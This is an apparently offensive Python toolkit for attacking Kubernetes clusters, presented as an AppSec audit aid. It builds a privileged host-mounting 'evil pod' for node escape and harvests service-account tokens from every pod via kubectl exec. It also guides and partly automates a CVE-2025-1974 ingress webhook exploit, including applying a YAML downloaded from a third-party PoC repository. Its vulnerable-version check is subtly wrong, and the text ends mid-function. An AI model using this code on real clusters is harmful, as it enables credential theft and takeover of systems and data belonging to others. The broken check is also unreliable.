#!/usr/bin/env python3
"""
k8s-pentest-framework - a small, extendable Kubernetes pentest toolkit for AppSec audits.

This version includes:
 - pod2node privileged-pod YAML generator (shows kubectl apply command and supports editing via $EDITOR/nano/vi)
 - privileged container scanner
 - RBAC token scanner
 - ingress checker: extracts ingress controller image/version, checks for CVE-2025-1974 vulnerability, uses PoC annotation from hardcoded JSON, patches existing Ingress or creates new
 - nodeport scanner
 - envinfo: Gain environment information from a pod
 - registryscan: Search for registries in the cluster and suggest curling them
 - nsbypass: Kubernetes namespaces bypass check (list ns and try access pods)
 - corecheck: Check core components (apiserver flags, etcd no-TLS, kubelet anon access)
 - shell: Spawn a shell and return to menu

Design goals:
 - Single-file, easy to read and extend.
 - Non-destructive by default: nothing is applied without an explicit print+instruction for `kubectl apply`.
 - Clear structure: add new commands by creating a function and registering it in COMMANDS.

Usage: run inside a context that has kubectl configured for the target cluster (your namespace access).

Author: generated for you. Use responsibly.
"""

import subprocess
import tempfile
import json
import os
import sys
from shutil import which
from datetime import datetime
from packaging import version
from loguru import logger

# Configure loguru to output to stdout/stderr with colors
logger.remove()  # Remove default handler
logger.add(sys.stdout, colorize=True, format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <cyan>{message}</cyan>")
logger.add(sys.stderr, colorize=True, format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <red>{message}</red>", level="ERROR")

# ---------------------
# Configuration
# ---------------------
DANGEROUS_PERMISSIONS = [
    "get secrets",
    "create pods",
    "delete pods",
    "get nodes",
    "create deployments",
    "patch deployments",
    "get services",
    "create services",
    "get configmaps",
    "create configmaps",
]

# Safe ingress payload presets (NON-EXPLOITATIVE examples inspired by public PoCs but limited to harmless header injection)
INGRESS_PAYLOAD_PRESETS = {
    'add-header': {
        'description': 'Add a harmless response header (safe for audits)',
        'annotation_key': 'nginx.ingress.kubernetes.io/configuration-snippet',
        'annotation_value': 'add_header X-ONRE-Test "onre-audit";'
    },
    'set-original-url-header': {
        'description': 'Set X-Original-URL header into the response (safe, non-exec)',
        'annotation_key': 'nginx.ingress.kubernetes.io/configuration-snippet',
        'annotation_value': 'add_header X-Original-URL $request_uri;'
    }
}

# URL for the ingress-nginx-controller YAML
INGRESS_CONTROLLER_YAML_URL = "https://raw.githubusercontent.com/sandumjacob/IngressNightmare-POCs/main/ingress-nginx-controller.yaml"

# Hardcoded poc.json content
POC_JSON_CONTENT = '''{
  "apiVersion": "admission.k8s.io/v1",
  "kind": "AdmissionReview",
  "request": {
    "kind": {
      "group": "networking.k8s.io",
      "version": "v1",
      "kind": "Ingress"
    },
    "resource": {
      "group": "",
      "version": "v1",
      "resource": "namespaces"
    },
    "operation": "CREATE",
    "object": {
      "metadata": {
        "name": "deads",
        "annotations": {
            "nginx.ingress.kubernetes.io/mirror-host": "test"
        }
      },
      "spec": {
        "rules": [
        {
            "host": "jacobsandum.com",
            "http": {
            "paths": [
                {
                "path": "/",
                "pathType": "Prefix",
                "backend": {
                    "service": {
                    "name": "kubernetes",
                    "port": {
                        "number": 80
                    }
                    }
                }
                }
            ]
            }
        }
        ],
        "ingressClassName": "nginx"
      }
    }
  }
}'''

# Global variable to track if banner has been shown in this session
BANNER_SHOWN = False

# ---------------------
# Banner (scary + ONRE)
# ---------------------
BANNER = r'''
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##+*%%@@%#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%-:::-=++@@%+**@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%%::...:-++.%%===*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@#%::....-.:..#%::--#*%@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-%=-:...:.*: .##:.:::+%*@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%#*.:.:.. -#%.:#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*+=+=*%#+=...##+*#%#%#*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%*#++=-=#--*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**-=+=*+=-:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+:-::++==%@@@=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-:=-:-=:-%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#-..::...::.*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%##=:..-:.   ......+*+*#*#*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##+-..::=-.    ..:.  ..::=---*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#++*-:..-=-=---:...-.     ..::-=#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*++-.::=-*****#+.-:. . ..:-===#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**+==-=+*%@%%%%%%+=+...:::==++*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**==*+-=#+=***=+#=:--::==+=+*#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##+-=+=---.=---::..-==-++***+*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%*#=+===-:::.....:.:-=:++++***@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%***=++####%##++:=-+++****#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%#*%%@@@@@@@@%#+=++*#*%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#%@@@@@@@@@@@@@%+#*##%%%%@%%*.=#@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@##*#*#%%@%%. -+#%@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@%%@@@@@@@@@@@@@@@#%##%%%@%%.:+#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%=-*%@@@@@@@@@@*:+###*@%%%@@@@@@@@@@@%%#%%%@%%%.:+#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#=.+++##@@@@@@@@##%%%%%%#%##%%%%%%%%@%%%%%%%%%#..*#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#=*##%%%%%@@@@@@@%%%@@%%@%%%%%%%%%@@@@%%@%%%%..:*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%@@@@@@%%%%@%@%%%%@@@@@@@@@@@@@%+.:*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@###%%%%%%%#*:%@@@@@%%%%@@%%%@@@@@@@@@@%%.:*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%##@@@@%@%%%%%%%@@@@@@@@%%..*%%@@*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@@%#=+@@%#%%%%%%%%%+%%%#=..*#%@@@*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#%%%%%%%@%#+=..*#%%%@@%%%*....+#%%%@@@%#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#%%%%%%%%#=...#%%%@@@%%####%%%@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%%%%%%##+.*%%%@@%%%%%%%%@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%*#%%%%%%%@@%@@@@%@@@@@%@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%%%###############=. .*#%%%%%@@@%%@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%%%#:. ...... .......   .-#%%%%%@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@%%#... ....-=++-:.:-==-=+*+##%%%%%%%%%@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@%=.  ..++**####%########%#%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@*:.:+*##%##%%%#%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@#+*##%%#%%%@@@@@@@@@@@@@@@%%##%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%%%%%%%%@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%.#%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%+...+#%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%#-.....=*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#........::-=*##@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%#.. ..:+===*#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%*...:==*%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%. .=*##%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%#*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                     O N R E

             a tiny, extendable k8s pentest toolkit
'''

# ---------------------
# Helpers
# ---------------------

def check_prereqs():
    for cmd in ("kubectl", "curl"):
        if which(cmd) is None:
            logger.error(f"{cmd} not found in PATH. Install it or add to PATH.")
            sys.exit(1)
    if which("nmap") is None:
        logger.warning("nmap not found in PATH. Install it for NodePort scanning.")
    if which("etcdctl") is None:
        logger.warning("etcdctl not found in PATH. Install it for etcd access check.")

def run(cmd, capture=True, check=False, input=None):
    """Run a shell command. Returns CompletedProcess"""
    try:
        if capture:
            return subprocess.run(cmd, shell=True, check=check, stdout=subprocess.PIPE, stderr=subprocess.PIPE, input=input, text=True)
        else:
            return subprocess.run(cmd, shell=True, check=check)
    except Exception as e:
        logger.error(f"Failed to run command '{cmd}': {e}")
        return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(e))

def kubectl_json(cmd_tail):
    """Run kubectl and parse JSON output"""
    cp = run(f"kubectl {cmd_tail} -o json")
    if cp.returncode != 0:
        logger.error(f"Could not execute 'kubectl {cmd_tail}': {cp.stderr}")
        return None
    try:
        return json.loads(cp.stdout)
    except json.JSONDecodeError:
        logger.error(f"Invalid JSON from 'kubectl {cmd_tail}'")
        return None

def detect_editor():
    """Detect an editor: $EDITOR, then nano, then vi/vim. Return command or None."""
    env = os.environ.get('EDITOR')
    if env:
        return env
    for e in ('nano', 'vi', 'vim'):
        if which(e):
            return e
    return None

def edit_tempfile(initial_text, suffix='.yml'):
    """Write initial_text to a temp file, open editor if available, return edited content (or None if not edited)."""
    editor = detect_editor()
    with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix=suffix) as tf:
        path = tf.name
        tf.write(initial_text)
        tf.flush()

    if editor is None:
        logger.warning(f"No editor found ($EDITOR, nano, vi). Skipping edit. You can manually edit the saved file at {path}")
        with open(path, 'r') as f:
            content = f.read()
        return content, path

    logger.info(f"Opening editor: {editor} {path}")
    try:
        subprocess.run(f"{editor} {path}", shell=True)
    except Exception as e:
        logger.error(f"Failed to run editor: {e}")
    with open(path, 'r') as f:
        content = f.read()
    return content, path

# ---------------------
# Modules (functions to extend)
# ---------------------

def pod2node_interactive():
    """Gather nodes, pods and offer to generate a privileged 'evil' pod YAML for a specific node."""
    logger.info("[1] pod2node check / privileged-pod generator")
    nodes = kubectl_json("get nodes")
    if not nodes:
        logger.error("Could not get nodes. Check kubectl context and permissions.")
        return

    node_names = [n['metadata']['name'] for n in nodes.get('items', [])]
    logger.info(f"Found {len(node_names)} nodes")
    for i, n in enumerate(node_names, 1):
        logger.info(f"   {i}. {n}")

    choice = input("Choose a node index to target (or press Enter to cancel): ").strip()
    if not choice:
        logger.info("Cancelled.")
        return
    try:
        idx = int(choice) - 1
        target_node = node_names[idx]
    except (ValueError, IndexError):
        logger.error("Invalid choice")
        return

    # Default YAML
    default_image = 'busybox'
    yaml_template = f"""
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: evil-pod
  name: evil-pod
  namespace: audit
spec:
  nodeName: {target_node}
  hostPID: true
  hostIPC: true
  hostNetwork: true
  volumes:
  - name: host-fs
    hostPath:
      path: /
  containers:
  - image: {default_image}
    name: evil-pod
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host-fs
      mountPath: /host
  restartPolicy: Never
"""

    logger.info("Generated evil pod YAML (dry run):\n")
    logger.info(f"\n{yaml_template}")

    # Offer to edit
    if input('Edit YAML before saving? [y/N]: ').lower().startswith('y'):
        edited, tmp_path = edit_tempfile(yaml_template, suffix='.yml')
        logger.info("Edited YAML preview:\n")
        logger.info(f"\n{edited}")
        final_yaml = edited
    else:
        final_yaml = yaml_template
        tmp_path = None

    # Save
    save_path = input('Save YAML to file path (default ./evil-pod.yml): ').strip() or './evil-pod.yml'
    with open(save_path, 'w') as f:
        f.write(final_yaml)
    logger.success(f"Wrote {save_path}")

    # Show exact kubectl apply command (do not execute)
    logger.info("To apply this manifest (ONLY in authorized test environments) run:")
    logger.info(f"  kubectl apply -f {save_path}")
    logger.warning("Note: this manifest is privileged. Do NOT apply against systems you do not own.")

def privileged_containers_scan():
    """Search for containers/pods with privileged:true across namespaces and show quick info."""
    logger.info("[2] Scanning for privileged containers in all namespaces...")
    pods = kubectl_json("get pods --all-namespaces")
    if not pods:
        logger.error("Could not list pods.")
        return

    found = []
    for p in pods.get('items', []):
        ns = p['metadata']['namespace']
        name = p['metadata']['name']
        for c in p.get('spec', {}).get('containers', []):
            sc = c.get('securityContext') or {}
            if sc.get('privileged') or sc.get('allowPrivilegeEscalation'):
                found.append((ns, name, c.get('name'), c.get('image'), sc))

    if not found:
        logger.info("No privileged containers found (quick scan).")
        return

    logger.info(f"Found {len(found)} potentially privileged containers:")
    for ns, pod, cname, image, sc in found:
        logger.info(f"   - {ns}/{pod} container={cname} image={image} sc={sc}")
    logger.info("You can try to exec into them manually with `kubectl exec -n <ns> -it <pod> -c <container> -- /bin/sh`")

def rbac_token_checker():
    """RBAC checker: for each pod try to read the serviceaccount token and check dangerous permissions."""
    logger.info("[3] RBAC token scanner (attempts to read SA tokens from pods)")
    api_server_cp = run("kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}'")
    if api_server_cp.returncode != 0:
        logger.error("Could not determine API server URL. Aborting.")
        return
    API_SERVER = api_server_cp.stdout.strip().strip("'")

    pods = kubectl_json('get pods --all-namespaces')
    if not pods:
        logger.error("Could not list pods. Aborting.")
        return

    report_lines = []
    total_pods = 0
    total_dangerous = 0

    for p in pods.get('items', []):
        ns = p['metadata']['namespace']
        name = p['metadata']['name']
        total_pods += 1
        logger.info(f"Checking {ns}/{name} ...")
        cp = run(f"kubectl exec -n {ns} {name} -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", capture=True)
        token = cp.stdout.strip() if cp.returncode == 0 else ''
        if not token:
            logger.info("No token found")
            continue

        with tempfile.NamedTemporaryFile(mode='w', delete=False) as tf:
            kubeconfig = tf.name
            tf.write(f"""apiVersion: v1
kind: Config
clusters:
- name: temp-cluster
  cluster:
    insecure-skip-tls-verify: true
    server: {API_SERVER}
users:
- name: temp-user
  user:
    token: {token}
contexts:
- name: temp-context
  context:
    cluster: temp-cluster
    user: temp-user
current-context: temp-context
""")

        dangerous_found = []
        for perm in DANGEROUS_PERMISSIONS:
            cp_can = run(f"kubectl --kubeconfig={kubeconfig} auth can-i {perm}")
            if cp_can.returncode == 0 and 'yes' in cp_can.stdout:
                dangerous_found.append(perm)
        os.unlink(kubeconfig)

        if dangerous_found:
            total_dangerous += 1
            sa_name = p.get('spec', {}).get('serviceAccountName')
            logger.warning(f"DANGEROUS -> {dangerous_found} (SA: {sa_name})")
            report_lines.append(f"{ns}/{name} -> {dangerous_found} (SA: {sa_name})")
        else:
            logger.success("No dangerous permissions found")

    logger.info("--- RBAC scan summary ---")
    logger.info(f"Pods scanned: {total_pods}")
    logger.info(f"Pods with dangerous SA perms: {total_dangerous}")
    if report_lines:
        logger.info("Detailed findings:")
        for l in report_lines:
            logger.info(f"  {l}")
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    report_path = f"/tmp/k8s_rbac_report_{ts}.txt"
    with open(report_path, 'w') as rf:
        rf.write('\n'.join(report_lines))
    logger.success(f"Full report saved to: {report_path}")

def is_vulnerable_version(tag):
    """Check if the ingress controller version is vulnerable to CVE-2025-1974."""
    try:
        ver = version.parse(tag)
        return ver < version.parse("1.12.1") or ver < version.parse("1.11.5")
    except version.InvalidVersion:
        logger.warning(f"Could not parse version tag: {tag}")
        return False

def parse_image_version(image):
    """Attempt to parse a k8s image string and return (repo, name, tag)."""
    if not image:
        return (None, None, None)
    parts = image.split('/')
    last = parts[-1]
    if ':' in last:
        name, tag = last.split(':', 1)
    else:
        name, tag = last, 'latest'
    repo = '/'.join(parts[:-1] + [name])
    return repo, name, tag

def ingress_checker():
    """Check for ingress-controller (nginx) pods, extract images/versions, and follow CVE-2025-1974 exploit flow."""
    logger.info("[4] Ingress controller version and CVE-2025-1974 PoC helper")

    # Hardcoded PoC JSON content
    try:
        poc_data = json.loads(POC_JSON_CONTENT)
        annotation_value = poc_data['request']['object']['metadata']['annotations']['nginx.ingress.kubernetes.io/mirror-host']
        poc_presets = {
            'cve-2025-1974': {
                'description': 'PoC for CVE-2025-1974 to inject mirror-host annotation',
                'annotation_key': 'nginx.ingress.kubernetes.io/mirror-host',
                'annotation_value': annotation_value
            }
        }
        logger.success("Loaded hardcoded PoC JSON for CVE-2025-1974.")
    except json.JSONDecodeError:
        logger.error("Invalid hardcoded PoC JSON. Aborting.")
        return

    # Check for ingress controller pods
    namespaces = ['ingress-nginx', 'kube-system', 'default']
    found_entries = []
    vulnerable_entries = []
    webhook_ports = {}
    for ns in namespaces:
        pods = kubectl_json(f"get pods -n {ns}")
        if not pods:
            logger.warning(f"No pods found in namespace {ns}")
            continue
        for p in pods.get('items', []):
            name = p['metadata']['name']
            if 'ingress-nginx-controller' in name.lower():
                for c in p.get('spec', {}).get('containers', []):
                    img = c.get('image')
                    if 'ingress-nginx/controller' in img:
                        repo, cname, tag = parse_image_version(img)
                        entry = {'namespace': ns, 'pod': name, 'container': c.get('name'), 'image': img, 'repo': repo, 'name': cname, 'tag': tag}
                        found_entries.append(entry)
                        if is_vulnerable_version(tag):
                            vulnerable_entries.append(entry)
                        # Check for webhook port
                        for port in p.get('spec', {}).get('containers', [{}])[0].get('ports', []):
                            if port.get('name') == 'webhook' or port.get('containerPort') == 8443:
                                webhook_ports[name] = port.get('containerPort', 8443)
                            else:
                                webhook_ports[name] = 8443  # Default webhook port

    if not found_entries:
        logger.warning("No ingress controller pods with image 'ingress-nginx/controller' found.")
        if input('Create ingress-nginx-controller from GitHub YAML? [y/N]: ').lower().startswith('y'):
            logger.info("Downloading ingress-nginx-controller.yaml...")
            cp = run(f"curl -s {INGRESS_CONTROLLER_YAML_URL}", capture=True)
            if cp.returncode != 0 or not cp.stdout.strip():
                logger.error("Failed to download ingress-nginx-controller.yaml.")
                return
            yaml_content = cp.stdout
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.yml') as tf:
                tf.write(yaml_content)
                yaml_path = tf.name
            logger.info("Applying ingress-nginx-controller.yaml...")
            cp = run(f"kubectl apply -f {yaml_path}", capture=True)
            if cp.returncode != 0:
                logger.error(f"Failed to apply YAML: {cp.stderr}")
                os.unlink(yaml_path)
                return
            logger.success("Ingress-nginx-controller created. Rerun the command to check.")
            os.unlink(yaml_path)
            return
        else:
            logger.info("Cancelled. Aborting ingress helper.")
            return

    logger.info("Detected ingress controller pods:")
    for i, e in enumerate(found_entries, 1):
        vuln_status = "VULNERABLE to CVE-2025-1974" if e in vulnerable_entries else "Not vulnerable"
        webhook_port = webhook_ports.get(e['pod'], 8443)
        logger.info(f"  {i}. {e['namespace']}/{e['pod']} -> image={e['image']} tag={e['tag']} ({vuln_status}) webhook_port={webhook_port}")

    # Choose mode based on vulnerability
    if vulnerable_entries:
        logger.warning("Vulnerable ingress controller detected!")
        logger.info("Choose exploitation mode:")
        logger.info("  1. Manual: Apply PoC annotation to existing Ingress or create new.")
        logger.info("  2. Automatic: Run full CVE-2025-1974 exploit cycle.")
        logger.info("  3. Custom: Create your own PoC annotation.")
        mode_choice = input('Select mode (1, 2, or 3, or Enter for manual): ').strip() or '1'
        mode = 'auto' if mode_choice == '2' else 'custom' if mode_choice == '3' else 'manual'
        preset = poc_presets['cve-2025-1974']
    else:
        logger.success("No vulnerable versions found. CVE-2025-1974 exploit is unlikely to work.")
        logger.info("You can still:")
        logger.info("  1. Use PoC from hardcoded JSON to apply annotation.")
        logger.info("  2. Create your own PoC.")
        mode_choice = input('Select action (1 or 2, or Enter to cancel): ').strip()
        if not mode_choice:
            logger.info("Action cancelled.")
            return
        mode = 'manual' if mode_choice == '1' else 'custom'
        preset = poc_presets['cve-2025-1974']

    # Select target pod
    choice = input('Choose an entry index to base PoC on (or Enter for first vulnerable/any): ').strip()
    target = None
    if choice:
        try:
            idx = int(choice) - 1
            target = found_entries[idx]
        except (ValueError, IndexError):
            logger.error("Invalid index, selecting automatically.")
    if not target and vulnerable_entries:
        target = vulnerable_entries[0]
    elif not target:
        target = found_entries[0]

    # Get webhook port for target
    webhook_port = webhook_ports.get(target['pod'], 8443)
    logger.info(f"Using webhook port {webhook_port} for pod {target['pod']}")

    # Create custom PoC
    if mode == 'custom':
        logger.info("Creating custom PoC for Ingress...")
        annotation_key = input('Enter annotation key (e.g., nginx.ingress.kubernetes.io/mirror-host): ').strip() or 'nginx.ingress.kubernetes.io/mirror-host'
        annotation_value = input('Enter annotation value (multiline, end with empty line):\n')
        lines = []
        while True:
            line = input()
            if line.strip() == '':
                break
            lines.append(line)
        annotation_value = '\n      '.join(lines)
        preset = {'annotation_key': annotation_key, 'annotation_value': annotation_value, 'description': 'Custom PoC'}

    # Check for existing Ingress
    ingress_ns = input('Namespace for the Ingress (default: default): ').strip() or 'default'
    ingress_name = input('Ingress name to check or create (default: onre-audit-ingress): ').strip() or 'onre-audit-ingress'
    existing_ingress = kubectl_json(f"get ingress {ingress_name} -n {ingress_ns}")

    if existing_ingress:
        logger.info(f"Found existing Ingress {ingress_name} in namespace {ingress_ns}")
        if input('Apply PoC annotation to existing Ingress? [y/N]: ').lower().startswith('y'):
            logger.info("Applying PoC annotation to existing Ingress...")
            patch_cmd = f"kubectl patch ingress {ingress_name} -n {ingress_ns} --type='merge' -p '{{\"metadata\":{{\"annotations\":{{\"{preset['annotation_key']}\":\"{preset['annotation_value']}\"}}}}}}'"
            cp = run(patch_cmd, capture=True)
            if cp.returncode != 0:
                logger.error(f"Failed to patch Ingress: {cp.stderr}")
                return
            logger.success(f"Applied PoC annotation to Ingress {ingress_name}")
            save_path = None
        else:
            logger.info("Cancelled. Aborting.")
            return
    else:
        logger.info(f"No Ingress {ingress_name} found in namespace {ingress_ns}. Creating new...")
        host = input('Host for the Ingress (example: jacobsandum.com) [optional]: ').strip() or 'jacobsandum.com'

        annotation_block = f"""  annotations:
    {preset['annotation_key']}: |
      {preset['annotation_value']}
"""

        host_block = f"""  rules:
  - host: {host}
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: kubernetes
            port:
              number: 80
  ingressClassName: nginx
"""

        ingress_yaml = f"""
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: {ingress_name}
  namespace: {ingress_ns}
{annotation_block}
spec:
{host_block}
"""

        logger.info("Generated Ingress manifest (dry run):\n")
        logger.info(f"\n{ingress_yaml}")

        if input('Edit Ingress manifest before saving? [y/N]: ').lower().startswith('y'):
            edited, tmp_path = edit_tempfile(ingress_yaml, suffix='.yml')
            logger.info("Edited Ingress preview:\n")
            logger.info(f"\n{edited}")
            final_yaml = edited
        else:
            final_yaml = ingress_yaml
            tmp_path = None

        save_path = input('Save Ingress YAML to file path (default ./onre-ingress.yml): ').strip() or './onre-ingress.yml'
        with open(save_path, 'w') as f:
            f.write(final_yaml)
        logger.success(f"Wrote {save_path}")

        logger.info("To apply this manifest (ONLY in authorized test environments) run:")
        logger.info(f"  kubectl apply -f {save_path}")

    if mode == 'manual':
        logger.info("Full exploitation cycle guidance for CVE-2025-1974 (manual mode):")
        if not existing_ingress:
            logger.info("  1. Ensure a dummy service exists (or create one):")
            logger.info(f"     kubectl create svc clusterip kubernetes --tcp=80 -n {ingress_ns}")
            logger.info("  2. Apply the Ingress manifest:")
            logger.info(f"     kubectl apply -f {save_path}")
        logger.info("  3. Set up port-forward to webhook:")
        logger.info(f"     kubectl port-forward -n {target['namespace']} {target['pod']} 1337:{webhook_port}")
        logger.info("  4. Send AdmissionReview request:")
        logger.info(f"     curl --insecure -v -H 'Content-Type: application/json' --data @poc.json https://localhost:1337/fake/path")
        logger.info("  5. Check logs for success (look for 'successfully validated configuration, accepting'):")
        logger.info(f"     kubectl logs {target['pod']} -n {target['namespace']}")
        logger.info("  6. Clean up after testing:")
        if not existing_ingress:
